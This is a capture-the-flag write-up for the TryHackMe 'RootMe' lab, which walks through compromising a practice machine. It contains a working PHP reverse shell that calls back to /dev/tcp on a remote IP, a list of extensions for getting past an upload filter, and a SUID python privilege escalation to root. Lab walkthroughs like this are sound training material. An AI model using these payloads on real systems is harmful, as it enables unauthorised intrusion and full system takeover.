# TryHackMe RootMe Writeup

---

## **`Nmap`** Scan

```ruby
nmap -sCV -Pn 10.112.178.214
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 23:24 EDT
Nmap scan report for 10.112.178.214
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1c:cb:6d:3d:f6:44:5a:3c:ea:ee:0c:24:39:45:bc:d3 (RSA)
|   256 5e:3c:5a:de:2f:97:10:3f:cf:23:5c:07:72:70:ff:2d (ECDSA)
|_  256 d0:1e:6c:85:9a:18:44:23:a6:a6:82:90:f3:28:b3:7f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds

```

## open port 80 found 

```ruby
http://10.112.178.214/
```

<img width="1868" height="715" alt="image" src="https://github.com/user-attachments/assets/43ad1159-09ea-473e-9e06-cbe739404bdc" />

## **`Fuzzing`** with gobuster

```ruby
gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://10.112.178.214
```

<img width="1081" height="434" alt="image" src="https://github.com/user-attachments/assets/33aee8e6-519c-4b87-9eab-f97ea8d0f660" />

## interisting let's see `/panal` and `/uploads`

<img width="1715" height="589" alt="image" src="https://github.com/user-attachments/assets/70cfc228-f673-43f2-80c3-62541fd43ba0" />

## i will try to upload normal file and see if i will see it in **`/uploads`**

<img width="943" height="596" alt="image" src="https://github.com/user-attachments/assets/6f8e8a4e-47c5-487e-813f-9d11b1965435" />

## it uploaded successfully 

<img width="867" height="300" alt="image" src="https://github.com/user-attachments/assets/af68ff2b-9b7d-4d07-bfaf-1e93a1ba8c76" />

## nice now i will try to upload reverse shell php file `shell.php`

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.137.69/9999 0>&1'");
?>
```

<img width="1255" height="485" alt="image" src="https://github.com/user-attachments/assets/144ed6bc-b204-45ef-a3e9-9335726910c1" />

## ohh so it refuse to upload php files let's find which extension website accept 

```http
php
php3
php4
php5
php7
phtml
pht
phar
phps
php8
```

<img width="1572" height="593" alt="image" src="https://github.com/user-attachments/assets/bdd1f8ff-3b35-40d5-bdb9-50ec36dc2bc5" />

<img width="1355" height="483" alt="image" src="https://github.com/user-attachments/assets/8851440c-3d0f-4a84-b294-3cdaaa783c5a" />

## when open **`shell.php5`** it open shell 

<img width="1560" height="477" alt="image" src="https://github.com/user-attachments/assets/59f8fa93-e145-447d-9b8e-e21bf38eb2ca" />

## make it stable shell 

```
python3 -c 'import pty,os; pty.spawn("/bin/bash")'
```

## now search for **`user.txt`**

```ruby
find / -name user.txt 2>/dev/null
```

<img width="1242" height="264" alt="image" src="https://github.com/user-attachments/assets/533ce5a5-b81f-4240-9e6e-cda0d65c31c7" />

## now we want to do privesc as we get shell by reverse shell we don't have password so we can't do `sudo -l`

<img width="1081" height="97" alt="image" src="https://github.com/user-attachments/assets/67fdf71e-32e0-4603-b715-36e19e0aa00e" />

## so will try to find files with SUID / GUID permissoins 

```ruby
find / -perm /6000 -type f 2>/dev/null
```

## mmm found **`python`**

<img width="1097" height="305" alt="image" src="https://github.com/user-attachments/assets/e890abc6-c452-4622-ac3d-e0232b3b2a9d" />

## open [GTFOBins](https://gtfobins.org/gtfobins/python/)

<img width="1218" height="221" alt="image" src="https://github.com/user-attachments/assets/5983dc35-3371-4fa8-9ff0-50d049d7e658" />

```ruby
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<img width="858" height="172" alt="image" src="https://github.com/user-attachments/assets/5c21e613-bd5c-427e-9222-c1ee2dce2f68" />

